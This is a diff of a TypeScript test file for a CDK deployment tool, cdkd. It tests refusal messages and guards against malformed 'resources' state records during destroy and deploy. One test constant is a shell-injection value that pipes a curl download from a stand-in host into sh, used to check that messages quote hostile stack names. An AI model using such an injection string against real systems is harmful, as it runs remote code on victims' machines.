@@ -7,7 +7,9 @@ import {
   hasReadableOutputs,
   hasReadableResources,
   isReadableBag,
+  malformedDeployResourcesRefusalMessage,
   malformedDestroyOutputsRefusalMessage,
+  malformedDestroyResourcesRefusalMessage,
   malformedExportSourceWarning,
   malformedLocalOutputsWarning,
   malformedNestedChildOutputsRefusalMessage,
@@ -22,6 +24,8 @@ import {
   refuseMalformedOutputs,
   refuseMalformedOutputsForDestroy,
   refuseMalformedResourceProperties,
+  refuseMalformedResourcesForDeploy,
+  refuseMalformedResourcesForDestroy,
   refuseMalformedState,
   repairMalformedOutputsForReadOnly,
   repairMalformedResourcePropertiesForReadOnly,
@@ -68,6 +72,7 @@ const UNREADABLE: ReadonlyArray<readonly [string, unknown]> = [
   ['absent', undefined],
   ['an array', []],
   ['a number', 5],
+  ['a boolean', true],
   ['a string', 'ab'],
 ];
 
@@ -507,6 +512,365 @@ describe('the two go-to-k/cdkd#3207 refusal helpers', () => {
         }
         expect(refused, `${name} / ${label}`).toBe(!readable);
       }
+    });
+  }
+});
+
+/**
+ * The `resources` container's two GATE-SCOPED refusals (issue
+ * [go-to-k/cdkd#3161](https://github.com/go-to-k/cdkd/issues/3161)) — the
+ * `outputs` half's shape, applied to the container `destroy` and `deploy` were
+ * the last write-capable readers of.
+ */
+describe('the gate-scoped resources texts (issue go-to-k/cdkd#3161)', () => {
+  const HOSTILE = "a'; curl http://x|sh; echo '";
+  const CONTROL_ONLY = String.fromCharCode(0x00, 0x01);
+
+  const TEXTS: ReadonlyArray<readonly [string, (s: string, r: string) => string]> = [
+    ['the DESTROY refusal', malformedDestroyResourcesRefusalMessage],
+    ['the DEPLOY refusal', malformedDeployResourcesRefusalMessage],
+  ];
+
+  // The same four properties `safeIdentifier`'s note requires of every message
+  // in this module, one row per text rather than a comment claiming they are
+  // inherited — inheritance is exactly what stops holding when a helper is
+  // inlined.
+  for (const [label, build] of TEXTS) {
+    it(`${label} shell-quotes a hostile name and stays on one line`, () => {
+      const m = build(HOSTILE, 'us-east-1');
+      expect(m).not.toContain(`${HOSTILE} --stack-region`);
+      expect(m).toContain('cdkd state show');
+      expect(m.split('\n')).toHaveLength(1);
+    });
+
+    it(`${label} names the container it is about`, () => {
+      expect(build('S', 'us-east-1')).toContain(`'resources'`);
+    });
+  }
+
+  /**
+   * The sanitize / cap properties are asserted on the DEPLOY text and on the
+   * destroy's EXACT arm only, and the split is the point rather than an
+   * exemption: the destroy's WITHHOLD arm is reached by exactly the inputs
+   * these cases feed (a name that sanitizes to empty, a name past the cap),
+   * and that arm deliberately prints NO identity at all — so demanding
+   * `UNRENDERABLE` or a capped `q…` there would be demanding the thing it
+   * exists not to do. What the withhold arm owes instead is asserted below.
+   */
+  const SANITIZING: ReadonlyArray<readonly [string, (s: string, r: string) => string]> = [
+    ['the DEPLOY refusal', malformedDeployResourcesRefusalMessage],
+    // The destroy's exact arm, reached by keeping the REGION ordinary and the
+    // stack name renderable — which is what `malformedStateDetail` renders.
+    ['the DESTROY refusal (exact arm)', malformedStateRefusalMessage],
+  ];
+
+  for (const [label, build] of SANITIZING) {
+    it(`${label} renders an identifier that sanitizes to EMPTY as a placeholder`, () => {
+      expect(build(CONTROL_ONLY, 'us-east-1')).toContain(UNRENDERABLE);
+    });
+
+    it(`${label} CAPS a multi-kilobyte name so the remedy stays on screen`, () => {
+      const long = build('q'.repeat(5000), 'us-east-1');
+      expect(long).toContain(`${'q'.repeat(128)}...`);
+      expect(long).toContain('cdkd state show');
+      expect(long.length).toBeLessThan(2000);
+    });
+  }
+
+  /**
+   * The WITHHOLD arm's own contract, which is the inverse of the two cases
+   * above: having said the printed identity may match another record, it must
+   * not then hand over a command built from that identity. An earlier revision
+   * kept `malformedStateDetail`'s pasteable
+   * `cdkd state show 'prod-api' --stack-region 'us-east-1' --json`, so
+   * following the message READ the healthy sibling, returned a clean record,
+   * and raised the operator's confidence immediately before the destructive
+   * step (review round 2 of go-to-k/cdkd#3332).
+   */
+  it('the WITHHOLD arm offers no command built from the identity it distrusts', () => {
+    for (const [label, stack, region] of [
+      ['a trimmed name', 'prod-api ', 'us-east-1'],
+      ['a name that sanitizes to empty', CONTROL_ONLY, 'us-east-1'],
+      ['a name past the cap', 'q'.repeat(5000), 'us-east-1'],
+    ] as const) {
+      const m = malformedDestroyResourcesRefusalMessage(stack, region);
+      expect(m, label).toContain('does NOT render exactly');
+      // The TEMPLATE, not a substitution — the module's own no-identity form.
+      expect(m, label).toContain('cdkd state show <stack> --stack-region <region> --json');
+      expect(m, label).toContain('The state record this command loaded');
+      // And nothing quoted: every pasteable command in this module renders its
+      // identifiers inside `'...'`, so their absence is what proves none was
+      // built. A quoted EMPTY pair would be the degenerate form of the same
+      // defect, so it is refused by the same assertion.
+      expect(m.includes("cdkd state show '"), `${label}: a substituted show command survived`).toBe(
+        false
+      );
+      expect(m.includes("cdkd state orphan '"), `${label}: a substituted orphan command`).toBe(
+        false
+      );
+    }
+  });
+
+  it('the DESTROY refusal names the FAST PATH, which is the whole defect', () => {
+    const m = malformedDestroyResourcesRefusalMessage('S', 'us-east-1');
+    expect(m).toContain('DELETES state');
+    expect(m).toContain('empty-stack fast path');
+    // The measurement that settles refuse-versus-repair: reading the bag as
+    // empty IS the damaging outcome, so "just repair it" is not the safe half.
+    expect(m).toContain('Reading the bag as EMPTY is that same outcome');
+    // And the answer to go-to-k/cdkd#3161's objection that refusing a CLEANUP
+    // command leaves the user stuck.
+    expect(m).toContain('cdkd state orphan');
+    // Not the generic write-capable text, whose harm is the SAVE.
+    expect(m).not.toContain('saving over a record');
+  });
+
+  /**
+   * The `cdkd state orphan` remedy is a TEMPLATE, never a substituted command,
+   * and this is the case that keeps it one.
+   *
+   * `state orphan` DELETES a record. The `region` the destroy refusal is handed
+   * is `state.region ?? ctx.baseRegion`, and `state.region` is RECORD-BODY
+   * content `getState` does not check against the key it loaded from —
+   * measured 2026-09-17: a record planted at `.../us-east-1/state.json`
+   * carrying `"region": "eu-west-1"` rendered a pasteable
+   * `cdkd state orphan <stack> --stack-region eu-west-1`, aiming a destructive
+   * command at a DIFFERENT region's record for the same stack. That is
+   * `stackClause`'s misdirection class, one field over; the divergence itself
+   * is go-to-k/cdkd#3328.
+   *
+   * The asymmetry with the `cdkd state show` line in the same message is
+   * deliberate: that one READS, and substituting into it is
+   * `malformedStateDetail`'s pre-existing behaviour.
+   */
+  it('spells the DESTRUCTIVE remedy as a template, so a record-supplied region cannot aim it', () => {
+    const PLANTED = 'zz-planted-1';
+    const m = malformedDestroyResourcesRefusalMessage('MyStack', PLANTED);
+    expect(m).toContain('cdkd state orphan <stack> --stack-region <region>');
+    // Non-vacuity first: the region really is in the message, so the bound
+    // below is a POSITION test rather than an absence test.
+    expect(m).toContain(PLANTED);
+    const orphanAt = m.indexOf('cdkd state orphan');
+    expect(orphanAt, 'the orphan remedy is gone; this case is asserting nothing').toBeGreaterThan(
+      -1
+    );
+    // The discriminating half. The planted region may appear in the prose and
+    // in the read-only `state show` remedy, but nothing at or after the
+    // destructive command may carry it — `lastIndexOf` is what makes that a
+    // bound on EVERY occurrence rather than on the first.
+    expect(
+      m.lastIndexOf(PLANTED),
+      'a record-supplied region was substituted into, or after, the destructive remedy'
+    ).toBeLessThan(orphanAt);
+  });
+
+  /**
+   * The template alone is not enough, because the name a reader types into it
+   * comes from the clause ABOVE — and `safeIdentifier` composes `displaySafe`,
+   * which TRIMS. A record keyed `'prod-api '` opens the message as
+   * `State for 'prod-api' (...)`, byte-identical to a HEALTHY sibling, so an
+   * operator orphaning "the record the line above names" deletes the intact
+   * one. The remedy is therefore GATED on both identifiers rendering EXACTLY.
+   */
+  const INEXACT: ReadonlyArray<readonly [string, string, string]> = [
+    ['a TRIMMED stack name', 'prod-api ', 'us-east-1'],
+    ['a stack name with a SUBSTITUTED character', 'pro\u0000d', 'us-east-1'],
+    // Past STACK_REF_MAX_CODE_POINTS (1152), the cap THIS message measures
+    // against — not the 128 the module's other texts use. A 400-character name
+    // renders exactly here on purpose: an ordinary multi-level nested child
+    // runs past 150 code points, and truncating one put a HEALTHY record in
+    // the withhold arm (review round 2 of go-to-k/cdkd#3332).
+    ['a TRUNCATED stack name', `${'q'.repeat(5000)}`, 'us-east-1'],
+    ['a TRIMMED region', 'prod-api', ' us-east-1'],
+  ];
+
+  for (const [label, stack, region] of INEXACT) {
+    it(`withholds the removal target for ${label}`, () => {
+      const m = malformedDestroyResourcesRefusalMessage(stack, region);
+      expect(
+        m,
+        'a record whose identity does not render exactly still got a removal target, so the ' +
+          'operator can be sent to a healthy same-rendering record'
+      ).not.toContain('cdkd state orphan');
+      expect(m).toContain('does NOT render exactly');
+      expect(m).toContain('cdkd state list --long');
+    });
+  }
+
+  /**
+   * The destroy refusal is THROWN through a caller that classifies
+   * "already deleted" by SUBSTRING. `NestedStackProvider.delete` raises it for
+   * a malformed CHILD record, and the parent's delete loop — like the deploy
+   * engine's — reads `does not exist` / `was not found` / `NoSuchEntity` and
+   * friends as an idempotent success, DROPS the state row and reports the
+   * child deleted. That is precisely the data loss this guard exists to stop,
+   * reached through the message instead of through the bag.
+   *
+   * `src/provisioning/nested-stack-messages.ts` records the same rule for the
+   * other text thrown down that path. Pinned on the TEMPLATE, which is the
+   * half a later reword can break; a hostile IDENTITY is a separate residual,
+   * bounded because a child's name is `<parent>~<logicalId>` and neither half
+   * can contain a space.
+   */
+  it('contains no phrase the callers read as ALREADY-DELETED', () => {
+    const ALREADY_DELETED = [
+      'does not exist',
+      'was not found',
+      'not found',
+      'No policy found',
+      'NoSuchEntity',
+      'NotFoundException',
+      'ResourceNotFoundException',
+    ];
+    // Both arms of the exactness gate, since they are different texts.
+    for (const [label, m] of [
+      ['exact', malformedDestroyResourcesRefusalMessage('MyStack', 'us-east-1')],
+      ['withheld', malformedDestroyResourcesRefusalMessage('My Stack ', 'us-east-1')],
+    ] as const) {
+      for (const phrase of ALREADY_DELETED) {
+        expect(
+          m.includes(phrase),
+          `the ${label} destroy refusal contains ${JSON.stringify(phrase)}, which a parent's ` +
+            `delete loop reads as "already deleted" — it would DROP the child's state row and ` +
+            `report the nested stack destroyed`
+        ).toBe(false);
+      }
+    }
+  });
+
+  it('measures exactness against the STATE-RECORD cap, not the 128 its siblings use', () => {
+    // The boundary, both sides. Without the lower row a cap regression to 128
+    // passes every case above; without the upper one the cap could vanish
+    // entirely and a planted multi-kilobyte name would still be named.
+    const ordinary =
+      'MyProductionRootStack~InnerServiceNestedStackInnerServiceNestedStackResourceB4B2B7C9~LeafWorkerNestedStackLeafWorkerNestedStackResource7F3A1D22';
+    expect(ordinary.length, 'the probe name no longer exceeds 128').toBeGreaterThan(128);
+    expect(
+      malformedDestroyResourcesRefusalMessage(ordinary, 'us-east-1'),
+      'an ordinary nested-child name is now withheld, so the fallback is the common path'
+    ).toContain('cdkd state orphan');
+    expect(
+      malformedDestroyResourcesRefusalMessage('q'.repeat(2000), 'us-east-1'),
+      'a multi-kilobyte name is named, so the cap has stopped bounding anything'
+    ).not.toContain('cdkd state orphan');
+  });
+
+  it('keeps the removal target for an EXACT identity — the control for the gate', () => {
+    // Without this, a gate that withheld unconditionally would satisfy every
+    // case above while making the remedy unreachable.
+    const m = malformedDestroyResourcesRefusalMessage('prod-api', 'us-east-1');
+    expect(m).toContain('cdkd state orphan <stack> --stack-region <region>');
+    expect(m).not.toContain('does NOT render exactly');
+  });
+
+  it('the DEPLOY refusal names the RE-CREATE, and holds under --dry-run', () => {
+    const m = malformedDeployResourcesRefusalMessage('S', 'us-east-1');
+    expect(m).toContain('re-provisions a stack that already exists');
+    expect(m).toContain("under '--dry-run' too");
+    expect(m).toContain('Nothing was provisioned and no state was written');
+    expect(m).toContain("'cdkd diff' previews the stack with this map read as EMPTY");
+    // Not the destroy text: a deploy reaches no fast path, and pointing a
+    // deploy refusal at `cdkd state orphan` would advise deleting the record
+    // it is refusing to act on.
+    expect(m).not.toContain('empty-stack fast path');
+    expect(m).not.toContain('cdkd state orphan');
+  });
+
+  it('all three resources texts are DISTINCT — a borrowed sentence states a wrong consequence', () => {
+    const rendered = [
+      malformedStateRefusalMessage('S', 'r'),
+      malformedDestroyResourcesRefusalMessage('S', 'r'),
+      malformedDeployResourcesRefusalMessage('S', 'r'),
+    ];
+    expect(new Set(rendered).size).toBe(rendered.length);
+  });
+});
+
+describe('the two go-to-k/cdkd#3161 refusal helpers', () => {
+  const HELPERS: ReadonlyArray<
+    readonly [
+      string,
+      (s: StackState, n: string, r: string) => void,
+      (n: string, r: string) => string,
+    ]
+  > = [
+    [
+      'refuseMalformedResourcesForDestroy',
+      refuseMalformedResourcesForDestroy,
+      malformedDestroyResourcesRefusalMessage,
+    ],
+    [
+      'refuseMalformedResourcesForDeploy',
+      refuseMalformedResourcesForDeploy,
+      malformedDeployResourcesRefusalMessage,
+    ],
+  ];
+
+  for (const [name, refuse, text] of HELPERS) {
+    // The FULL table here, `absent` included: unlike `outputs`, an absent
+    // `resources` key is a defect rather than a record cdkd writes on purpose.
+    for (const [label, value] of UNREADABLE) {
+      it(`${name} REFUSES ${label} with the shared code and its OWN text`, () => {
+        let thrown: unknown;
+        try {
+          refuse(state(value), 'MyStack', 'eu-west-1');
+        } catch (err) {
+          thrown = err;
+        }
+        expect(thrown, `a ${label} resources bag was not refused`).toBeInstanceOf(CdkdError);
+        expect((thrown as CdkdError).code).toBe(STATE_RESOURCES_MALFORMED);
+        expect((thrown as CdkdError).message).toBe(text('MyStack', 'eu-west-1'));
+      });
+    }
+
+    it(`${name} FLOOR: a populated and a legitimately EMPTY bag pass through`, () => {
+      // Without this, "refuses what it must" says nothing — a helper that threw
+      // on everything would satisfy every case above while making the command
+      // unusable. The `{}` row is the one that would break real records: an
+      // empty stack and an unreadable bag both COUNT zero, so only the shape
+      // test separates them.
+      expect(() =>
+        refuse(state({ A: { physicalId: 'p', resourceType: 'T', properties: {} } }), 'S', 'r')
+      ).not.toThrow();
+      expect(() => refuse(state({}), 'S', 'r')).not.toThrow();
+    });
+
+    it(`${name} never MUTATES the record it refuses`, () => {
+      const s = state('abcdef');
+      expect(() => refuse(s, 'S', 'r')).toThrow();
+      expect(s.resources).toBe('abcdef' as unknown as StackState['resources']);
+    });
+
+    it(`${name} agrees with hasReadableResources on every shape`, () => {
+      // ONE predicate under all three entry points, so no two of them can come
+      // to different verdicts about the same record — only about what to DO.
+      for (const [label, value] of [...UNREADABLE, ['an empty map', {}] as const]) {
+        const readable = hasReadableResources(state(value));
+        let refused = false;
+        try {
+          refuse(state(value), 'S', 'r');
+        } catch {
+          refused = true;
+        }
+        expect(refused, `${name} / ${label}`).toBe(!readable);
+      }
+    });
+
+    it(`${name} marks the refusal non-retryable`, () => {
+      // Both fire inside a `withRetry` path — a nested child's destroy reaches
+      // `runDestroyForStack` through `NestedStackProvider.delete`, and a nested
+      // child's deploy runs inside the parent's `withRetry(provider.create)`.
+      // Without the marker the SUBSTRING classifiers decide, and a
+      // caller-supplied stack name can carry a live retryable pattern into the
+      // message. Issue #1838's shape.
+      let thrown: unknown;
+      try {
+        refuse(state(null), 'S', 'r');
+      } catch (e) {
+        thrown = e;
+      }
+      expect(thrown, 'the refusal did not fire, so the marker assertion is vacuous').toBeDefined();
+      expect(isMarkedNonRetryable(thrown)).toBe(true);
     });
   }
 });
@@ -1060,8 +1424,93 @@ describe('write-capable commands refuse; read-only ones repair', () => {
     // one launders silently — in the command that runs precisely when state is
     // already suspect.
     'src/cli/commands/rollback.ts',
+    // Added by go-to-k/cdkd#3161. Each refuses through its OWN entry point
+    // carrying its own TEXT, because neither does what
+    // `malformedStateRefusalMessage` describes: `destroy-runner.ts` DELETES the
+    // record down an empty-stack fast path rather than saving over it, and
+    // `deploy-engine.ts` re-provisions the whole stack before the save the
+    // shared text names. Both delegate to `hasReadableResources`, so the
+    // VERDICT stays singular while the message varies — the same shape the
+    // `outputs` half took under go-to-k/cdkd#3207.
+    'src/deployment/deploy-engine.ts',
+    'src/cli/commands/destroy-runner.ts',
   ];
+  // A THIRD write-capable reader exists and is deliberately NOT in that list:
+  // `src/provisioning/providers/nested-stack-provider.ts` calls no `saveState`
+  // of its own, which is the PREMISE the loop above asserts — so it gets its
+  // own case below, exactly as the `outputs` half already gives it one. An
+  // earlier revision of the comment above called the two entries "the LAST two
+  // write-capable readers", which this file contradicts (review round 2 of
+  // go-to-k/cdkd#3332).
   const REPAIR = ['src/cli/commands/diff-recursive.ts'];
+
+  /**
+   * Every helper in this module that REFUSES on the `resources` container.
+   *
+   * Derived by grep rather than by recall:
+   *   grep -n "^export function refuseMalformed" \
+   *     src/state/malformed-resources-bag.ts
+   * then subtracting the `Outputs` and `ResourceProperties` families, which
+   * the partition case below re-derives so a fourth cannot be added unnoticed.
+   */
+  const RESOURCES_REFUSAL_SPELLINGS = [
+    'refuseMalformedState(',
+    'refuseMalformedResourcesForDestroy(',
+    'refuseMalformedResourcesForDeploy(',
+  ];
+
+  /**
+   * The module's refusal entry points partition into exactly three containers.
+   *
+   * A UNION count alone would stay green through a RE-CLASSIFICATION — an
+   * `outputs` refusal renamed into the `resources` family keeps the total at
+   * seven — so each partition is asserted separately, and the leftover set is
+   * asserted EMPTY so a helper belonging to none of them fails here instead of
+   * silently escaping every dominance loop in this file.
+   */
+  it('every refusal the module exports is classified into exactly one container', () => {
+    const moduleSrc = code('src/state/malformed-resources-bag.ts');
+    const exported = [...moduleSrc.matchAll(/export function (refuseMalformed\w*)\(/g)].map(
+      (m) => `${m[1]!}(`
+    );
+    expect(exported.length, 'the grep stopped matching; this fence is reading nothing').toBe(7);
+
+    const outputs = exported.filter((n) => /Outputs\(|Outputs[A-Z]/.test(n));
+    const properties = exported.filter((n) => n.includes('ResourceProperties'));
+    const resources = exported.filter(
+      (n) => !outputs.includes(n) && !properties.includes(n)
+    );
+    // Derived from REFUSAL_SPELLINGS rather than re-spelled: a second hard-coded
+    // copy of that triple is what drifts when a fourth outputs refusal lands.
+    expect(outputs.sort()).toEqual([...REFUSAL_SPELLINGS].sort());
+    expect(properties).toEqual(['refuseMalformedResourceProperties(']);
+    expect(
+      [...resources].sort(),
+      'a `resources` refusal exists that RESOURCES_REFUSAL_SPELLINGS does not name, so every ' +
+        'dominance check below would pass over nothing for a file refusing through it.'
+    ).toEqual([...RESOURCES_REFUSAL_SPELLINGS].sort());
+  });
+
+  /**
+   * The premise of a sentence in `malformedDestroyResourcesRefusalMessage`:
+   * it tells an operator who wants the record gone to run `cdkd state orphan`,
+   * which is what answers go-to-k/cdkd#3161's objection to refusing a cleanup
+   * command at all. That advice is only true while `state orphan` does not
+   * itself read the bag it is being pointed at.
+   */
+  it('cdkd state orphan reads no resources bag, so the destroy refusal may point at it', () => {
+    const src = code('src/cli/commands/state.ts');
+    const at = src.indexOf('async function stateOrphanCommand');
+    expect(at, 'stateOrphanCommand was renamed; this fence is reading nothing').toBeGreaterThan(-1);
+    // Bounded to that function's own body: `state.ts` hosts every `cdkd state`
+    // subcommand, so a whole-file scan would be answered by `state resources`.
+    const body = src.slice(at, src.indexOf('\nfunction ', at + 1));
+    expect(
+      body.includes('.resources'),
+      'cdkd state orphan now reads the resources bag, so the destroy refusal must stop naming ' +
+        'it as the supported way to drop a record whose bag is unreadable.'
+    ).toBe(false);
+  });
 
   /**
    * The FIRST expression in each file that READS the resources bag. The
@@ -1079,6 +1528,23 @@ describe('write-capable commands refuse; read-only ones repair', () => {
     'src/cli/commands/import.ts': 'hasOwnProperty.call(existingState.resources',
     'src/cli/commands/orphan.ts': 'id in state.resources',
     'src/cli/commands/rollback.ts': '{ ...baseState.resources }',
+    // go-to-k/cdkd#3161. Each anchor is the LOADED record's bag, which is what
+    // the guard is about.
+    //
+    // `deploy-engine.ts`'s is the debug line that reports the resource count —
+    // the first read of `currentState`, and the one that raised the bare
+    // `TypeError` on a `null` bag. `currentState` is local to `deploy()`, so no
+    // earlier occurrence of this spelling exists to make the bound vacuous.
+    'src/deployment/deploy-engine.ts': 'Object.keys(currentState.resources).length',
+    // `destroy-runner.ts`'s is the COUNT the whole defect turns on: the
+    // empty-stack fast path that deletes `state.json` sits immediately below
+    // it, so a guard anywhere under this line refuses a record it has already
+    // removed. Deliberately NOT `countProtectedResources`'s
+    // `Object.values(state.resources ?? {})`, which is textually earlier: that
+    // is an exported helper reading whatever bag it is HANDED, the same
+    // relationship the outputs half records for `redactStateForPersist`, and
+    // the runner calls it far below this point.
+    'src/cli/commands/destroy-runner.ts': 'Object.keys(state.resources).length',
   };
 
   for (const file of REFUSE) {
@@ -1089,7 +1555,7 @@ describe('write-capable commands refuse; read-only ones repair', () => {
       // class, because its exit 1 is spoken for ("--fail found plaintext").
       // Both must carry the same MESSAGE, which the exit-code case pins.
       const refuses =
-        src.includes('refuseMalformedState(') ||
+        RESOURCES_REFUSAL_SPELLINGS.some((call) => src.includes(call)) ||
         (src.includes('hasReadableResources(') && src.includes('malformedStateRefusalMessage('));
       expect(
         refuses,
@@ -1138,10 +1604,29 @@ describe('write-capable commands refuse; read-only ones repair', () => {
       // only checks the refusal exists would not have caught it, and moving
       // any of these calls below its file's first bag dereference reds
       // nothing without this.
-      const refusalAt = Math.max(
-        src.indexOf('refuseMalformedState('),
-        src.indexOf('hasReadableResources(')
-      );
+      // The LAST of the per-spelling FIRST occurrences (`Math.max` over
+      // `indexOf`), which is stricter than any one of them: a file refusing
+      // through two spellings must have BOTH above its first dereference.
+      // Every spelling ends in `(`, which an `import` clause cannot contain, so the `import` line at
+      // the top of the file is not a candidate and no import-stripping pass is
+      // needed — a round of this fence added one and it changed not a single
+      // index on any file here (measured, review of go-to-k/cdkd#3161).
+      //
+      // Taken over the spellings actually present, and THAT is the half that
+      // was vacuous: `indexOf` answers `-1` for an absent one, `-1` is less
+      // than every dereference index, so a fence reading a FIXED pair passed
+      // over nothing on a file refusing through a third spelling — and
+      // go-to-k/cdkd#3161 added two such files.
+      const positions = [...RESOURCES_REFUSAL_SPELLINGS, 'hasReadableResources(']
+        .map((call) => src.indexOf(call))
+        .filter((at) => at > -1);
+      expect(
+        positions.length,
+        `${file} contains none of the refusal spellings this fence knows about, so its ` +
+          `dominance check would pass over nothing. Add the spelling to ` +
+          `RESOURCES_REFUSAL_SPELLINGS.`
+      ).toBeGreaterThan(0);
+      const refusalAt = Math.max(...positions);
       const derefAt = FIRST_DEREF[file]!;
       const derefIndex = src.indexOf(derefAt);
       expect(
@@ -1195,6 +1680,60 @@ describe('write-capable commands refuse; read-only ones repair', () => {
       ).toBe(false);
     });
   }
+
+  /**
+   * The THIRD write-capable reader of the `resources` bag
+   * (go-to-k/cdkd#3161), and the one that writes no state ITSELF — so the loop
+   * above cannot hold it: its premise assertion is exactly `saveState(`.
+   *
+   * `NestedStackProvider.delete` counts the CHILD's bag to log
+   * `N resource(s)` and only THEN hands the record to `runDestroyForStack`, so
+   * the runner's own guard — however well placed inside it — could not see a
+   * `null` or absent child bag; the bare `TypeError` fired one call earlier.
+   * Same relationship, and same fence shape, as the `outputs` half already
+   * records for this file.
+   */
+  it('src/provisioning/providers/nested-stack-provider.ts REFUSES a malformed CHILD resources bag', () => {
+    const file = 'src/provisioning/providers/nested-stack-provider.ts';
+    const src = code(file);
+    // The premise. If it ever writes state directly it belongs in REFUSE.
+    expect(
+      src.includes('saveState('),
+      `${file} now writes state directly; move it into REFUSE.`
+    ).toBe(false);
+    expect(
+      src.includes('refuseMalformedResourcesForDestroy('),
+      `${file} counts the CHILD's resources bag before handing the record to the destroy ` +
+        `runner, so a null or absent child bag dies on a bare TypeError one call above the ` +
+        `runner's own guard.`
+    ).toBe(true);
+    expect(
+      src.includes('repairMalformedResourcesForReadOnly'),
+      `${file} repairs the child's bag, which reports a damaged child as an EMPTY stack to the ` +
+        `destroy that follows.`
+    ).toBe(false);
+    // DOMINANCE against the first read of the child's bag, and against the
+    // hand-off itself — a guard below either is useless.
+    const derefAt = 'Object.keys(childStateData.state.resources).length';
+    const derefIndex = src.indexOf(derefAt);
+    expect(
+      derefIndex,
+      `${file} no longer contains \`${derefAt}\`; this fence's anchor is stale.`
+    ).toBeGreaterThan(-1);
+    const refusalAt = src.indexOf('refuseMalformedResourcesForDestroy(childStateData.state');
+    expect(
+      refusalAt,
+      `${file} refuses AFTER counting the child's bag, so the count this guard exists to ` +
+        `precede has already run.`
+    ).toBeGreaterThan(-1);
+    expect(refusalAt).toBeLessThan(derefIndex);
+    const handoffAt = src.indexOf('runDestroyForStack(childStackName');
+    expect(handoffAt, `${file} no longer hands the child record to the runner.`).toBeGreaterThan(-1);
+    expect(
+      refusalAt,
+      `${file} refuses AFTER entering the child destroy.`
+    ).toBeLessThan(handoffAt);
+  });
 
   /**
    * The `outputs` half (go-to-k/cdkd#3189). Same DOMINANCE shape as the refusal
@@ -1643,10 +2182,72 @@ describe('the retried refusals are marked non-retryable (issue #3207)', () => {
   // Two-sided on purpose: the CAP is that each refusal carries the marker, and
   // the FLOOR is that a healthy bag raises nothing at all -- a guard that threw
   // unconditionally would satisfy the cap alone.
+  //
+  // The table is DERIVED against the module's own export list below, so a
+  // refusal added later cannot join the family unmarked and unnoticed — which
+  // is exactly what happened to `refuseMalformedOutputs`, marked only by
+  // go-to-k/cdkd#3161's review round after shipping unmarked through
+  // go-to-k/cdkd#3192 and #3207.
   const RETRIED = [
-    ['destroy', () => refuseMalformedOutputsForDestroy({ outputs: 'abcdef' as unknown as Record<string, unknown> }, 'S', 'us-east-1')],
-    ['nested child', () => refuseMalformedNestedChildOutputs({ outputs: 'abcdef' as unknown as Record<string, unknown> }, 'P~C', 'us-east-1')],
+    ['destroy outputs', () => refuseMalformedOutputsForDestroy({ outputs: 'abcdef' as unknown as Record<string, unknown> }, 'S', 'us-east-1')],
+    ['nested child outputs', () => refuseMalformedNestedChildOutputs({ outputs: 'abcdef' as unknown as Record<string, unknown> }, 'P~C', 'us-east-1')],
+    ['deploy outputs', () => refuseMalformedOutputs({ outputs: 'abcdef' as unknown as Record<string, unknown> }, 'S', 'us-east-1')],
+    ['destroy resources', () => refuseMalformedResourcesForDestroy(state('abcdef'), 'S', 'us-east-1')],
+    ['deploy resources', () => refuseMalformedResourcesForDeploy(state('abcdef'), 'S', 'us-east-1')],
+    ['resource properties', () => refuseMalformedResourceProperties(state({ A: { physicalId: 'p', resourceType: 'T', properties: 'x' } }), 'S', 'us-east-1')],
   ] as const;
+
+  /**
+   * The COVERAGE half, and the reason the table above is not just a list.
+   *
+   * Every refusal this module exports rides a `withRetry` path at one caller
+   * or another, so the marker is the rule and its absence is the exception —
+   * `UNMARKED` is that exception, by NAME and with the reason, and the
+   * derivation asserts the two sets PARTITION the exports. Without it a
+   * seventh refusal lands unmarked and nothing says so, which is precisely how
+   * `refuseMalformedOutputs` — reached from `cdkd deploy`, and therefore from
+   * a nested child's deploy inside the parent's `withRetry(provider.create)` —
+   * shipped unmarked beside three marked siblings.
+   */
+  const UNMARKED: Record<string, string> = {
+    'refuseMalformedState(':
+      'its callers are `cdkd import`, `cdkd orphan` and `cdkd rollback`, none of which wraps ' +
+      'the call in withRetry — so the marker would fence nothing. Revisit if a retrying caller ' +
+      'is added.',
+  };
+
+  it('every refusal the module exports is either marked or a NAMED exception', () => {
+    const moduleSrc = code('src/state/malformed-resources-bag.ts');
+    const exported = [...moduleSrc.matchAll(/export function (refuseMalformed\w*)\(/g)].map(
+      (m) => `${m[1]!}(`
+    );
+    expect(exported.length, 'the grep stopped matching; this fence is reading nothing').toBe(7);
+    // A refusal is MARKED when its body reaches `markNonRetryable`. Read from
+    // the body rather than from the RETRIED table, so the two instruments stay
+    // independent — the table proves the marker is SET at runtime, this proves
+    // no export was left out of the table by omission.
+    const marked = exported.filter((name) => {
+      const at = moduleSrc.indexOf(`export function ${name.slice(0, -1)}(`);
+      const end = moduleSrc.indexOf('\nexport function ', at + 1);
+      const body = moduleSrc.slice(at, end === -1 ? undefined : end);
+      return body.includes('markNonRetryable(');
+    });
+    const unmarked = exported.filter((n) => !marked.includes(n));
+    expect(
+      unmarked.sort(),
+      'a refusal is neither marked non-retryable nor listed in UNMARKED with a reason. Every ' +
+        'one of these decides from a PERSISTED record, so a retry cannot change the verdict, ' +
+        'while the message interpolates identifiers a SUBSTRING-matching classifier reads as ' +
+        'transient (issue #1838).'
+    ).toEqual(Object.keys(UNMARKED).sort());
+    // And the exception must carry a reason of real length, not a bare entry.
+    for (const [name, reason] of Object.entries(UNMARKED)) {
+      expect(reason.length, `${name}'s exemption has no stated reason`).toBeGreaterThan(40);
+    }
+    // Non-vacuity: the RETRIED table must cover every MARKED export, or the
+    // runtime half silently shrinks while this source half stays green.
+    expect(RETRIED.length, 'RETRIED no longer drives every marked refusal').toBe(marked.length);
+  });
 
   it.each(RETRIED)('%s refuses with the non-retryable marker set', (_label, raise) => {
     let thrown: unknown;
@@ -1659,7 +2260,7 @@ describe('the retried refusals are marked non-retryable (issue #3207)', () => {
     expect(isMarkedNonRetryable(thrown)).toBe(true);
   });
 
-  it.each(RETRIED)('%s raises nothing for a readable bag', (_label, _raise) => {
+  it.each(RETRIED)('%s: the family raises nothing for a readable bag', (_label, _raise) => {
     expect(() => refuseMalformedOutputsForDestroy({ outputs: { A: 'v' } }, 'S', 'us-east-1')).not.toThrow();
     expect(() =>
       refuseMalformedNestedChildOutputs({ outputs: { A: 'v' } }, 'P~C', 'us-east-1')
